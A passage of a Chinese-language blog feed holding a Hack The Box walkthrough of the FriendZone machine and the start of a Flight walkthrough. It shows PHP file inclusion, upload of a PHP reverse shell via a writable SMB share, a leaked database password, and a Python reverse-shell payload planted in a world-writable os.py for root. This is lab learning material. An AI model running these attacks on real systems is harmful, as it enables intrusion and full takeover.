class="hljs-comment">#53(10.10.10.123) (TCP)</span><br>;; WHEN: Mon Aug 22 07:51:17 CST 2022<br>;; XFR size: 8 records (messages 1, bytes 289)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822075820527.png" alt="image-20220822075820527"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822075829432.png" alt="image-20220822075829432"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822075839982.png" alt="image-20220822075839982"></p><p>都是HTTPS端口，证书中没有发现其他东西。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822075944065.png" alt="image-20220822075944065"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822080104673.png" alt="image-20220822080104673"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822080128102.png" alt="image-20220822080128102"></p><p>有点文件包含的味道。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822081241638.png" alt="image-20220822081241638"></p><p>试了下第二个参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=dashboard<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822081654833.png" alt="image-20220822081654833"></p><p>它后端可能是 include “pagename” .php .源码确实是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">Crazy:~/HackThebox/FriendZone$ <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=&quot;</span>|base64 -d<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//echo &quot;&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;&quot;;</span><br><span class="hljs-comment">//echo &quot;&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;title&gt;FriendZone Admin !&lt;/title&gt;&quot;</span>;<br><span class="hljs-variable">$auth</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;FriendZoneAuth&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span> === <span class="hljs-string">&quot;e7749d0f4b4da5d03e6e9196fd1d18f1&quot;</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;image_id&quot;</span>]))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;&quot;</span>;<br> &#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;image_id&quot;</span>];<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;img src=&#x27;images/<span class="hljs-subst">$image</span>&#x27;&gt;&lt;/center&gt;&quot;</span>;<br><br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;&quot;</span>;<br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;pagename&quot;</span>].<span class="hljs-string">&quot;.php&quot;</span>);<br> <span class="hljs-comment">//echo $_GET[&quot;pagename&quot;];</span><br> &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;p&gt;You can&#x27;t see the content ! , please login !&lt;/center&gt;&lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>暂时没什么头绪，看了另一个上传页面。我猜它是upload.php:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ curl -k https://uploads.friendzone.red/upload.php<br><br>WHAT ARE YOU TRYING TO DO HOOOOOOMAN ! <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822082456406.png" alt="image-20220822082456406"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K&quot;</span>|<span class="hljs-built_in">base64</span> -d<br>&lt;?php<br><br>// not finished yet -- friendzone admin !<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;image&quot;</span>]))&#123;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Uploaded successfully !&lt;br&gt;&quot;</span>;<br><span class="hljs-built_in">echo</span> time()+3600;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;WHAT ARE YOU TRYING TO DO HOOOOOOMAN !&quot;</span>;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>这个上传页面是个假的。其实回想一下，已经有文件包含了，它添加后缀.php让我只能包含php文件，但是SMB为了留了一个共享可写的目录，Nmap脚本可以枚举共享对应的目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ nmap --script smb-enum-shares.nse -p445 10.10.10.123<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-22 08:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> friendzone.red (10.10.10.123)<br>Host is up (0.15s latency).<br><br>PORT    STATE SERVICE<br>445/tcp open  microsoft-ds<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\10.10.10.123\Development: <br>|     Type: STYPE_DISKTREE<br>|     Comment: FriendZone Samba Server Files<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\etc\Development<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.10.10.123\Files: <br>|     Type: STYPE_DISKTREE<br>|     Comment: FriendZone Samba Server Files /etc/Files<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\etc\hole<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\10.10.10.123\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))<br>|     Users: 1<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.10.10.123\general: <br>|     Type: STYPE_DISKTREE<br>|     Comment: FriendZone Samba Server Files<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\etc\general<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.10.10.123\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 35.73 seconds<br>zsh: segmentation fault  nmap --script smb-enum-shares.nse -p445 10.10.10.123<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ smbclient //10.10.10.123/Development -U <span class="hljs-string">&quot;whoami&quot;</span><br>Password <span class="hljs-keyword">for</span> [WORKGROUP\<span class="hljs-built_in">whoami</span>]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Aug 22 08:36:45 2022<br>  ..                                  D        0  Thu Jan 24 05:51:02 2019<br><br>                9221460 blocks of size 1024. 6450228 blocks available<br>smb: \&gt; put phpreverseshell.php <br>putting file phpreverseshell.php as \phpreverseshell.php (8.5 kb/s) (average 8.5 kb/s)<br>smb: \&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/phpreverseshell<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.123] 37494<br>Linux FriendZone 4.15.0-36-generic <span class="hljs-comment">#39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br> 03:39:33 up  1:30,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@FriendZone:/$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">bin   home            lib64       opt   sbin      tmp      vmlinuz.old</span><br><span class="hljs-string">boot  initrd.img      lost+found  proc  srv       usr</span><br><span class="hljs-string">dev   initrd.img.old  media       root  swapfile  var</span><br><span class="hljs-string">etc   lib             mnt         run   sys       vmlinuz</span><br><span class="hljs-string">www-data@FriendZone:/$ cd home</span><br><span class="hljs-string">cd home</span><br><span class="hljs-string">www-data@FriendZone:/home$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">friend</span><br><span class="hljs-string">www-data@FriendZone:/home$ cd friend</span><br><span class="hljs-string">cd friend</span><br><span class="hljs-string">www-data@FriendZone:/home/friend$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">user.txt</span><br><span class="hljs-string">www-data@FriendZone:/home/friend$ cat user.txt</span><br><span class="hljs-string">cat user.txt</span><br><span class="hljs-string">a9e..............................</span><br><span class="hljs-string">www-data@FriendZone:/home/friend$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@FriendZone:/var/www$ <span class="hljs-built_in">ls</span><br>admin  friendzone  friendzoneportal  friendzoneportaladmin  html  mysql_data.conf  uploads<br>www-data@FriendZone:/var/www$ <span class="hljs-built_in">cat</span> mysql_data.conf <br><span class="hljs-keyword">for</span> development process this is the mysql creds <span class="hljs-keyword">for</span> user friend<br><br>db_user=friend<br><br>db_pass=Agpyu12!0.213$<br><br>db_name=FZ<br>www-data@FriendZone:/var/www$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">friend@FriendZone:/opt/server_admin$ <span class="hljs-built_in">ls</span><br>reporter.py<br>friend@FriendZone:/opt/server_admin$ <span class="hljs-built_in">cat</span> reporter.py <br><span class="hljs-comment">#!/usr/bin/python</span><br><br>import os<br><br>to_address = <span class="hljs-string">&quot;admin1@friendzone.com&quot;</span><br>from_address = <span class="hljs-string">&quot;admin2@friendzone.com&quot;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Trying to send email to %s&quot;</span>%to_address<br><br><span class="hljs-comment">#command = &#x27;&#x27;&#x27; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#os.system(command)</span><br><br><span class="hljs-comment"># I need to edit the script later</span><br><span class="hljs-comment"># Sam ~ python developer</span><br>friend@FriendZone:/opt/server_admin$ <br></code></pre></td></tr></table></figure><p>python脚本导入了os库。而且存在一个定时任务，两分钟运行一次该脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2019/02/12 15:18:01 CMD: UID=0    PID=26106  | /usr/bin/python /opt/server_admin/reporter.py <br>2019/02/12 15:18:01 CMD: UID=0    PID=26105  | /bin/sh -c /opt/server_admin/reporter.py <br>2019/02/12 15:18:01 CMD: UID=0    PID=26104  | /usr/sbin/CRON -f <br>2019/02/12 15:20:01 CMD: UID=0    PID=26109  | /usr/bin/python /opt/server_admin/reporter.py <br>2019/02/12 15:20:01 CMD: UID=0    PID=26108  | /bin/sh -c /opt/server_admin/reporter.py <br>2019/02/12 15:20:01 CMD: UID=0    PID=26107  | /usr/sbin/CRON -f <br></code></pre></td></tr></table></figure><p>这个脚本我是没权限写入的，但是OS库似乎可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">friend@FriendZone:/usr/lib/python2.7$ find -<span class="hljs-built_in">type</span> f -writable -<span class="hljs-built_in">ls</span><br>   262202     28 -rw-rw-r--   1 friend   friend      25583 Jan 15  2019 ./os.pyc<br>   282643     28 -rwxrwxrwx   1 root     root        25910 Jan 15  2019 ./os.py<br>friend@FriendZone:/usr/lib/python2.7$ <br></code></pre></td></tr></table></figure><p>rwx.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br><br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;10.10.16.3&quot;</span>,<span class="hljs-number">1338</span>))<br>dup2(s.fileno(),<span class="hljs-number">0</span>)<br>dup2(s.fileno(),<span class="hljs-number">1</span>)<br>dup2(s.fileno(),<span class="hljs-number">2</span>)<br>pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>s.close()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/FriendZone$ nc -lvnp 1338                                       <br>listening on [any] 1338 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.123] 50348<br>root@FriendZone:~<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@FriendZone:~<span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br>b0..............................<br>root@FriendZone:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough Flight</title>
    <link href="/post/HackTheBox-Flight.html"/>
    <url>/post/HackTheBox-Flight.html</url>
    
    <content type="html"><![CDATA[<h3 id="PortInfo"><a href="#PortInfo" class="headerlink" title="PortInfo"></a>PortInfo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ <span class="hljs-built_in">cat</span> TcpPortInfo   <br><span class="hljs-comment"># Nmap 7.93 scan initiated Tue Dec 27 09:07:45 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -O -Pn -oN TcpPortInfo 10.10.11.187</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.187<br>Host is up (0.079s latency).<br><br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> (Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span><br>|_http-title: g0 Aviation<br><span class="hljs-number">88</span>/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2022</span>-<span class="hljs-number">12</span>-<span class="hljs-number">27</span> <span class="hljs-number">08</span>:<span class="hljs-number">07</span>:<span class="hljs-number">48</span>Z)<br><span class="hljs-number">135</span>/tcp  open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">445</span>/tcp  open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp  open  kpasswd5?<br><span class="hljs-number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp  open  tcpwrapped<br><span class="hljs-number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)<br><span class="hljs-number">3269</span>/tcp open  tcpwrapped<br><span class="hljs-number">5985</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp open  mc-nmf        .NET Message Framing<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br>No OS matches for host<br>Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: <span class="hljs-number">6</span>h59m55s<br>| smb2-time: <br>|   date: <span class="hljs-number">2022</span>-<span class="hljs-number">12</span>-<span class="hljs-number">27</span>T08:<span class="hljs-number">08</span>:<span class="hljs-number">02</span><br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   <span class="hljs-number">311</span>: <br>|_    Message signing enabled and required<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Tue Dec <span class="hljs-number">27</span> <span class="hljs-number">09</span>:<span class="hljs-number">08</span>:<span class="hljs-number">44</span> <span class="hljs-number">2022</span> -- <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">58.80</span> seconds<br></code></pre></td></tr></table></figure><p>Vhost:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 